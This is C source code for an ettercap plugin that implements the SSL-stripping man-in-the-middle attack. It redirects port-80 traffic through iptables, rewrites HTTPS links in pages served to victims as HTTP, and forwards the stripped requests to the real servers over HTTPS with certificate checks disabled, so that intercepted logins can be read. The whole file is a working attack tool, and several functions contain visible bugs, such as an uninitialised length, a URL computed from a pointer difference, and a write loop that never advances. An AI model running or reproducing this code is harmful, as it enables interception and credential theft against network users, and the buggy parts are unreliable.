/*
    sslstrip -- ettercap plugin -- SSL Strip per Moxie (http://www.thoughtcrime.org/software/sslstrip/)
   
    Copyright (C) Ettercap team
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/

#include <ec.h>
#include <ec_stdint.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_socket.h>
#include <ec_threads.h>
#include <ec_decode.h>


#ifdef HAVE_SYS_POLL_H
#include <sys/poll.h>
#endif

#ifdef HAVE_LIBCURL
#include <curl/curl.h>

/*
 * This plugin will basically replace all https links sent to the user's browser with http 
 * but keep track of those https links to send a proper HTTPS request to the links when requested.
 */


#define URL_PATTERN "(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)"

#define REQUEST_TIMEOUT 1200 /* If a request has not been used in 1200 seconds, remove it from list */

#define HTTP_RETRY 5
#define HTTP_WAIT 10

#define PROTO_HTTP 1
#define PROTO_HTTPS 2

#define HTTP_MAX (1024*20) //20KB max for HTTP requests.

#define BREAK_ON_ERROR(x,y,z) do {  \
   if (x == -EINVALID) {            \
      SAFE_FREE(z.DATA.disp_data);  \
      http_initialize_po(&z, z.DATA.data, z.DATA.len); \
      z.len = 64;                   \
      z.L4.flags = TH_RST;          \
      packet_disp_data(&z, z.DATA.data, z.DATA.len); \
      http_parse_packet(y, HTTP_CLIENT, &z); \
      http_wipe_connection(y);      \
      SAFE_FREE(z.DATA.data);       \
      SAFE_FREE(z.DATA.disp_data);  \
      ec_thread_exit();             \
   }                                \
} while(0)

/* lists */
struct http_ident {
	u_int32 magic;
	#define HTTP_MAGIC 0x0501e77f
	struct ip_addr L3_src;
	u_int16 L4_src;
	u_int16 L4_dst;
};

#define HTTP_IDENT_LEN sizeof(struct http_ident)

struct https_link {
	char *url;
	time_t last_used;
	LIST_ENTRY (https_link) next;	
};

struct http_connection {
	int fd; 
	u_int16 port[2];
	struct ip_addr ip[2];
	char *url;
	#define HTTP_CLIENT 0
	#define HTTP_SERVER 2
	CURL *handle; 
	char *buffer;
	size_t len;
	char curl_err_buffer[CURL_ERROR_SIZE];
	LIST_HEAD(, https_link) links;
};

/* globals */
static int main_fd;
static u_int16 bind_port;
static struct pollfd poll_fd;

/* protos */
int plugin_load(void *);
static int sslstrip_init(void *);
static int sslstrip_fini(void *);
static void sslstrip(struct packet_object *po);

/* http stuff */
static void Find_Url(u_char *to_parse, char **ret);
static size_t http_create_ident(void **i, struct packet_object *po);
static int http_sync_conn(struct http_connection *connection);
static int http_get_peer(struct http_connection *connection);
static int http_read(struct http_connection *connection, struct packet_object *po);
static int http_write(struct http_connection *connection);
static int http_insert_redirect(u_int16 dport);
static int http_remove_redirect(u_int16 port);
static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t len);
static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po);
static void http_wipe_connection(struct http_connection *connection);
static void http_handle_request(struct http_connection *connection, struct packet_object *po);
static void http_send(struct http_connection *connection, struct packet_object *po, int proto);
static void http_remove_https(struct http_connection *connection);
static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata);

/* thread stuff */
static int http_bind_wrapper(void);
static EC_THREAD_FUNC(http_accept_thread);
static EC_THREAD_FUNC(http_child_thread);

struct plugin_ops sslstrip_ops = {
	ettercap_version:	EC_VERSION, /* must match global EC_VERSION */
	name:			"sslstrip",
	info:			"SSLStrip plugin",
	version:		"1.0",
	init:			&sslstrip_init,
	fini:			&sslstrip_fini,
};

int plugin_load(void *handle)
{
	return plugin_register(handle, &sslstrip_ops);
}

static int sslstrip_init(void *dummy)
{

	/*
	 * Add IPTables redirect for port 80
         */
	if (http_bind_wrapper() != ESUCCESS) {
		USER_MSG("SSLStrip: Could not set up HTTP redirect\n");
		return PLUGIN_FINISHED;
	}
	
	/* start HTTP accept thread */
	ec_thread_new("http_accept_thread", "wrapper for HTTP connections", &http_accept_thread, NULL);

	/* add hook point in the dissector for HTTP traffic */
	//hook_add(HOOK_PROTO_HTTP, &sslstrip);
	hook_add(HOOK_HANDLED, &sslstrip);
	return PLUGIN_RUNNING;
}

static int sslstrip_fini(void *dummy)
{
	if (http_remove_redirect(bind_port) == -EFATAL) {
		USER_MSG("Unable to remove HTTP redirect, please do so manually.");
	}

	/* stop accept wrapper */
	pthread_t pid = ec_thread_getpid("http_accept_thread");
	
	if (!pthread_equal(pid, EC_PTHREAD_NULL))
		ec_thread_destroy(pid);

	return PLUGIN_FINISHED;
}

static void sslstrip(struct packet_object *po)
{
	//NOOP
}

/* Unescape the string */
static void Decode_Url(u_char *src)
{
   u_char t[3];
   u_int32 i, j, ch;

   /* Paranoid test */
   if (!src)
      return;

   /* NULL terminate for the strtoul */
   t[2] = 0;

   for (i=0, j=0; src[i] != 0; i++, j++) {
      ch = (u_int32)src[i];
      if (ch == '%' && isxdigit((u_int32)src[i + 1]) && isxdigit((u_int32)src[i + 2])) {
         memcpy(t, src+i+1, 2);
         ch = strtoul((char *)t, NULL, 16);
         i += 2;
      }
      src[j] = (u_char)ch;
   }
   src[j] = 0;
}

/* Gets the URL from the request */
static void Find_Url(u_char *to_parse, char **ret)
{
   u_char *fromhere, *page=NULL, *host=NULL;
   u_int32 len;
   char *tok;

   if (!strncmp((char *)to_parse, "GET ", 4))
      to_parse += strlen("GET ");
   else if (!strncmp((char *)to_parse, "POST ", 5))
      to_parse += strlen("POST ");
   else
      return;

   /* Get the page from the request */
   page = (u_char *)strdup((char *)to_parse);
   ec_strtok((char *)page, " HTTP", &tok);

   /* If the path is relative, search for the Host */
   if ((*page=='/') && (fromhere = (u_char *)strstr((char *)to_parse, "Host: "))) {
      host = (u_char *)strdup( (char *)fromhere + strlen("Host: ") );
      ec_strtok((char *)host, "\r", &tok);
   } else
      host = (u_char*)strdup("");

   len = strlen((char *)page) + strlen((char *)host) + 2;
   SAFE_CALLOC(*ret, len, sizeof(char));
   snprintf(*ret, len, "%s%s", host, page);

   SAFE_FREE(page);
   SAFE_FREE(host);

   Decode_Url((u_char *)*ret);
}

/* HTTP handling functions */
static int http_insert_redirect(u_int16 dport)
{
	char asc_dport[16];
	int ret_val, i=0;
	char *command, *p;
	char **param = NULL;

	if (GBL_CONF->redir_command_on == NULL)
		return -EFATAL;

	snprintf(asc_dport, 16, "%u", dport);

	command = strdup(GBL_CONF->redir_command_on);
	str_replace(&command, "%iface", GBL_OPTIONS->iface);
	str_replace(&command, "%port", "80");
	str_replace(&command, "%rport", asc_dport);

	DEBUG_MSG("http_insert_redirect: [%s]", command);

	/* split the string into the parameter array */
	for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
		SAFE_REALLOC(param, (i+1) * sizeof(char *));
		param[i++] = strdup(p);
	}

	SAFE_REALLOC(param, (i+1) * sizeof(char *));
	param[i] = NULL;

	switch(fork()) {
		case 0:
			execvp(param[0], param);
			exit(EINVALID);
		case -1:
			SAFE_FREE(param);
			return -EINVALID;
		default:
			SAFE_FREE(param);
			wait(&ret_val);
			if (ret_val == EINVALID)
				return -EINVALID;
	}

	return ESUCCESS;
}

static int http_remove_redirect(u_int16 dport)
{
        char asc_dport[16];
        int ret_val, i=0;
        char *command, *p;
        char **param = NULL;

        if (GBL_CONF->redir_command_off == NULL)
                return -EFATAL;

        snprintf(asc_dport, 16, "%u", dport);

        command = strdup(GBL_CONF->redir_command_off);
        str_replace(&command, "%iface", GBL_OPTIONS->iface);
        str_replace(&command, "%port", "80");
        str_replace(&command, "%rport", asc_dport);

        DEBUG_MSG("http_remove_redirect: [%s]", command);

        /* split the string into the parameter array */
        for (p = strsep(&command, " "); p!=NULL; p = strsep(&command, " ")) {
                SAFE_REALLOC(param, (i+1) * sizeof(char *));
                param[i++] = strdup(p);
        }

        SAFE_REALLOC(param, (i+1) * sizeof(char *));
        param[i] = NULL;

        switch(fork()) {
                case 0:
                        execvp(param[0], param);
                        exit(EINVALID);
                case -1:
                        SAFE_FREE(param);
                        return -EINVALID;
                default:
                        SAFE_FREE(param);
                        wait(&ret_val);
                        if (ret_val == EINVALID)
                                return -EINVALID;
        }

        return ESUCCESS;
}

static EC_THREAD_FUNC(http_accept_thread)
{
	struct http_connection *connection = NULL;
	u_int len = sizeof(struct sockaddr_in), i;
	struct sockaddr_in client_sin;

	ec_thread_init();

	DEBUG_MSG("SSLStrip: http_accept_thread initialized and ready");

	poll_fd.fd = main_fd;
	poll_fd.events = POLLIN;

	LOOP {
		poll(&poll_fd, 1, -1);
		SAFE_CALLOC(connection, 1, sizeof(struct http_connection));
		connection->fd= accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);

		if (connection->fd == -1) {
			SAFE_FREE(connection);
			continue;
		}

		ip_addr_init(&connection->ip[HTTP_CLIENT], AF_INET, (char *)&(client_sin.sin_addr.s_addr));
		connection->port[HTTP_CLIENT] = client_sin.sin_port;
		connection->port[HTTP_SERVER] = htons(80);
		connection->len = 0;

		/* create detached thread */
		ec_thread_new_detached("http_child_thread", "http child", &http_child_thread, connection, 1);	
	}

	return NULL;
}

static int http_get_peer(struct http_connection *connection)
{
	struct ec_session *s = NULL;
	struct packet_object po;
	void *ident= NULL;
	int i;

	memcpy(&po.L3.src, &connection->ip[HTTP_CLIENT], sizeof(struct ip_addr));
	po.L4.src = connection->port[HTTP_CLIENT];
	po.L4.dst = connection->port[HTTP_SERVER]; 

	http_create_ident(&ident, &po);

#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = HTTP_WAIT;
	tm.tv_nsec = 0;
#endif

	/* Wait for sniffing thread */
	for (i=0; i<HTTP_RETRY && session_get_and_del(&s, ident, HTTP_IDENT_LEN)!=ESUCCESS; i++)
#ifndef OS_WINDOWS
	nanosleep(&tm, NULL);
#else	
	usleep(HTTP_WAIT);
#endif

	if (i==HTTP_RETRY) {
		SAFE_FREE(ident);
		return -EINVALID;
	}

	memcpy(&connection->ip[HTTP_SERVER], s->data, sizeof(struct ip_addr));

	DEBUG_MSG("SSLstrip: Got peer!");
	
	SAFE_FREE(s->data);
	SAFE_FREE(s);
	SAFE_FREE(ident);

	return ESUCCESS;

}


static size_t http_create_ident(void **i, struct packet_object *po)
{
	struct http_ident *ident;

	SAFE_CALLOC(ident, 1, sizeof(struct http_ident));

	ident->magic = HTTP_MAGIC;

	memcpy(&ident->L3_src, &po->L3.src, sizeof(struct ip_addr));
	ident->L4_src = po->L4.src;
	ident->L4_dst = po->L4.dst;

	/* return the ident */
	*i = ident;
	return sizeof(struct http_ident);
}
static http_sync_conn(struct http_connection *connection) 
{
	if (http_get_peer(connection) != ESUCCESS)
		return -EINVALID;


	set_blocking(connection->fd, 0);
	return ESUCCESS;
}

static int http_read(struct http_connection *connection, struct packet_object *po)
{
	u_char *data;
	int len, err;

	err = ESUCCESS;

	len = read(connection->fd, po->DATA.data, HTTP_MAX);

	if (len == 0) {
		int sock_err = GET_SOCK_ERRNO();

		if (sock_err == EINTR || sock_err == EAGAIN)
			err = -ENOTHANDLED;
		else 
			err = -EINVALID;
	}

	DEBUG_MSG("SSLStrip: Read request %s", po->DATA.data);

	po->DATA.len = len;
	return err;	
}

static void http_handle_request(struct http_connection *connection, struct packet_object *po)
{
	struct https_link *link;
	char *url;
	char sent = 0;

	SAFE_CALLOC(connection->url, 1, 1024);

	if (connection->url==NULL)
		return;

	memset(connection->url, '\0', 1024);

	Find_Url(po->DATA.data, &connection->url);
	
	DEBUG_MSG("SSLStrip: Found URL %s", connection->url);

	LIST_FOREACH(link, &connection->links, next) {
		if (!strcmp(link->url, connection->url)) {
			DEBUG_MSG("SSLStrip: Sending HTTPS request");
			http_send(connection, po, PROTO_HTTPS);
			sent =1;
		}
	}


	if (!sent) {
		DEBUG_MSG("SSLStrip: Sending HTTP request");
		http_send(connection,po, PROTO_HTTP);
	}
}

static void http_send(struct http_connection *connection, struct packet_object *po, int proto)
{
	connection->handle = curl_easy_init();
	size_t iolen;	
	char *url;

	//Allow decoders to run for request

	http_parse_packet(connection, HTTP_CLIENT, po);

	if (proto == PROTO_HTTPS) {
		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYPEER, 0L);
		curl_easy_setopt(connection->handle, CURLOPT_SSL_VERIFYHOST, 0L);

		url = (char *)malloc(strlen(connection->url)+strlen("https://"));
		snprintf(url, strlen(connection->url)+strlen("https://"), "https://%s", connection->url);
	} else {
		url = (char *)malloc(strlen(connection->url)+strlen("http://"));
		snprintf(url, strlen(connection->url)+strlen("http://"), "http://%s", connection->url);
	}


	if (url==NULL) {
		USER_MSG("Not enough memory to allocate for URL %s", connection->url);
		return;
	}	

	curl_easy_setopt(connection->handle, CURLOPT_URL, url);
	curl_easy_setopt(connection->handle, CURLOPT_WRITEFUNCTION, http_receive_from_server);
	curl_easy_setopt(connection->handle, CURLOPT_WRITEDATA, connection);
	curl_easy_setopt(connection->handle, CURLOPT_ERRORBUFFER, connection->curl_err_buffer);

	if(curl_easy_send(connection->handle, po->DATA.data, po->DATA.len, &iolen) != CURLE_OK) {
		USER_MSG("Unable to send request to HTTP server: %s", connection->curl_err_buffer);
		return;
	} else if (iolen != po->DATA.len) {
		USER_MSG("Unable to send entire HTTP request, only sent %d bytes", iolen);
	} else {
		DEBUG_MSG("SSLStrip: Sent request to server");
	}

	//Now we must look for https links and add them to the list.
	//Also https:// needs to be changed to http://
	http_remove_https(connection);

	//Send result back to client
	if (http_write(connection) != ESUCCESS){
		USER_MSG("Unable to send HTTP response back to client");
	} else {
		DEBUG_MSG("Sent HTTP response back to client");
	}


	//Allow decoders to run on HTTP response
	http_initialize_po(po, connection->buffer, connection->len);
	http_parse_packet(connection, HTTP_SERVER, po);

	SAFE_FREE(url);
}

static int http_write(struct http_connection *connection)
{
	int len, err;
	int bytes_sent= 0;
	char *ptr = connection->buffer;

	while (bytes_sent < connection->len) {
		len = write(connection->fd, ptr, 1024);

		if (len <=0) {
			err = GET_SOCK_ERRNO();
			if (err != EAGAIN && err != EINTR)
				return -EINVALID;
		}
		
		if (bytes_sent < connection->len)
			ptr += bytes_sent;
	}

	return ESUCCESS;
}

static u_int http_receive_from_server(char *ptr, size_t size, size_t nmemb, void *userdata)
{
	struct http_connection *connection = (struct http_connection *)userdata;

	DEBUG_MSG("SSLStri: Received response from server %s", ptr);

	if (connection->len == 0) {
		//Initiailize buffer
		SAFE_CALLOC(connection->buffer, 1, size*nmemb);
		if (connection->buffer == NULL)
			return 0;

		memcpy(connection->buffer, ptr, size*nmemb);
	} else {
		char *b = realloc(connection->buffer, size*nmemb);
		
		if (b == NULL)
			return 0;

		memcpy(b, ptr, size*nmemb);
	}

	return size*nmemb;
}

EC_THREAD_FUNC(http_child_thread)
{
	struct packet_object po;
	int direction, ret_val, data_read;
	struct http_connection *connection;
#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = 0;
	tm.tv_nsec = 3000*1000;
#else
	int timeout = 3000;
#endif

	connection = (struct http_connection *)args;
	ec_thread_init();

	DEBUG_MSG("SSLstrip: Received HTTP connection");


	/* Connect to real HTTP server */
	if (http_sync_conn(connection) == -EINVALID) {
		DEBUG_MSG("SSLStrip: Could not get peer!!");
		if (connection->fd != -1)
			close_socket(connection->fd);
		SAFE_FREE(connection);	
		ec_thread_exit();
	}


	/* A fake SYN ACK */
	http_initialize_po(&po, NULL, 0);
	po.len = 64;
	po.L4.flags = (TH_SYN | TH_ACK);
	packet_disp_data(&po, po.DATA.data, po.DATA.len);
	http_initialize_po(&po, po.DATA.data, po.DATA.len);
	u_char *data = NULL;
	size_t len = 0;

	data = (u_char *)malloc(1024);
	
	if (!data){
		SAFE_FREE(connection);
		ec_thread_exit();
	}	

	data_read = 0;

	LOOP {

		ret_val = http_read(connection, &po);
		BREAK_ON_ERROR(ret_val, connection, po);

		if (ret_val == ESUCCESS)
			data_read=1;

		/* if we read data, write it to real server */
		if (data_read) {
			/* Look in the https_links list and if the url matches, send to HTTPS server.
			   Otherwise send to HTTP server */
			http_handle_request(connection, &po);
			http_initialize_po(&po, po.DATA.data, po.DATA.len);
		}
		
	}

	return NULL;
	
}


static void http_remove_https(struct http_connection *connection)
{

       char *tmp, *end, *ptr;
       size_t len;
       size_t slen = strlen("https://");
       char *pattern = "https://";
       char *with = "http://";
       size_t with_len = strlen(with);
       struct https_link *l;

       /* If no HTTPS links were found, return and do not add to list */
       if (!memmem(connection->buffer, connection->len, pattern, slen)) {
	       DEBUG_MSG("SSLStrip: Pattern not found");
               return;
       }

       DEBUG_MSG("SSLStrip: Found https");

       ptr = connection->buffer;
       end = ptr + len;

       do {
	       len = end - ptr;
               ptr = memmem(ptr, len, pattern, slen);


                if (!ptr) /* String not found, exit */
    	       		break;

                 /* Determine URL to add to list */
                 //ptr is at http
                 tmp = ptr;
                 tmp += slen;

                 char *link_end=strchr((const char*)tmp, '"');

		 if (link_end == NULL) {
			link_end = strchr(tmp, '\'');
		 }

                 *link_end--;

                 char *url = (char *)(link_end - tmp);

                 SAFE_CALLOC(l, 1, sizeof(struct https_link));

                 l->url = strdup(url);
                 l->last_used = time(NULL);

                 //Add to list
                 LIST_INSERT_HEAD(&connection->links, l, next);

                 //Continue to modify packet

                 len = end - ptr - slen;

                 memmove(ptr + with_len, ptr + slen, len);
                 memcpy(ptr, with, with_len);
                 ptr += with_len;

                 end += with_len - slen;

        } while (ptr != NULL && ptr < end);

        /* Iterate through all http_request and remove any that have not been used lately */
        struct https_link *link_tmp;
        time_t now = time(NULL);

        LIST_FOREACH_SAFE(l, &connection->links, next, link_tmp) {
                if(now - l->last_used >= REQUEST_TIMEOUT) {
                        LIST_REMOVE(l, next);
                        SAFE_FREE(l);
                }
        }
}

static void http_parse_packet(struct http_connection *connection, int direction, struct packet_object *po)
{
	FUNC_DECODER_PTR(start_decoder);
	int len;

	memcpy(&po->L3.src, &connection->ip[direction], sizeof(struct ip_addr));
	memcpy(&po->L3.dst, &connection->ip[!direction], sizeof(struct ip_addr));
	
	po->L4.src = connection->port[direction];
	po->L4.dst = connection->port[!direction];
	
	/* get time */
	gettimeofday(&po->ts, NULL);

	switch(ip_addr_is_local(&PACKET->L3.src, NULL)) {
		case ESUCCESS:
			PACKET->PASSIVE.flags &= ~FP_HOST_NONLOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_LOCAL;
			break;
		case -ENOTFOUND:
			PACKET->PASSIVE.flags &= ~FP_HOST_LOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_NONLOCAL;
			break;
		case -EINVALID:
			PACKET->PASSIVE.flags = FP_UNKNOWN;
			break;
	}

	/* let's start fromt he last stage of decoder chain */
	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT);
	start_decoder(po->DATA.data, po->DATA.len, &len, po);
}

static void http_initialize_po(struct packet_object *po, u_char *p_data, size_t len)
{
   /* 
    * Allocate the data buffer and initialize 
    * fake headers. Headers len is set to 0.
    * XXX - Be sure to not modify these len.
    */

   SAFE_FREE(po->DATA.data);

   memset(po, 0, sizeof(struct packet_object));
   if (p_data == NULL) {
      SAFE_CALLOC(po->DATA.data, 1, HTTP_MAX);
      po->DATA.len = HTTP_MAX;
   } else {
      SAFE_FREE(po->DATA.data);
      po->DATA.data = p_data;
      po->DATA.len = len;
   }

   po->L2.header  = po->DATA.data;
   po->L3.header  = po->DATA.data;
   po->L3.options = po->DATA.data;
   po->L4.header  = po->DATA.data;
   po->L4.options = po->DATA.data;
   po->fwd_packet = po->DATA.data;
   po->packet     = po->DATA.data;

   po->L3.proto = htons(LL_TYPE_IP);
   po->L3.ttl = 64;
   po->L4.proto = NL_TYPE_TCP;

}
/* main HTTP listen thread, this will accept connections
 * destined to port 80  */

static int http_bind_wrapper(void)
{
	u_int len = sizeof(struct sockaddr_in), i;
	bind_port = EC_MAGIC_16;
	struct sockaddr_in sa_in;

	ec_thread_init();

	DEBUG_MSG("http_listen_thread: initialized and ready");
	
	main_fd = socket(AF_INET, SOCK_STREAM, 0);
	memset(&sa_in, 0, sizeof(sa_in));
	sa_in.sin_family = AF_INET;
	sa_in.sin_addr.s_addr = INADDR_ANY;

	do {
		bind_port++;
		sa_in.sin_port = htons(bind_port);	
	} while (bind(main_fd, (struct sockaddr *)&sa_in, sizeof(sa_in)) != 0);

	DEBUG_MSG("SSLStrip plugin: bind 80 on %d", bind_port);
	
	if (http_insert_redirect(bind_port) != ESUCCESS)
		return -EFATAL;

	return ESUCCESS;

}

static void http_wipe_connection(struct http_connection *connection)
{
	close_socket(connection->fd);
	curl_easy_cleanup(connection->handle);

	if (connection)
		SAFE_FREE(connection);
}

#endif /* HAVE_LIBCURL */

// vim:ts=3:expandtab
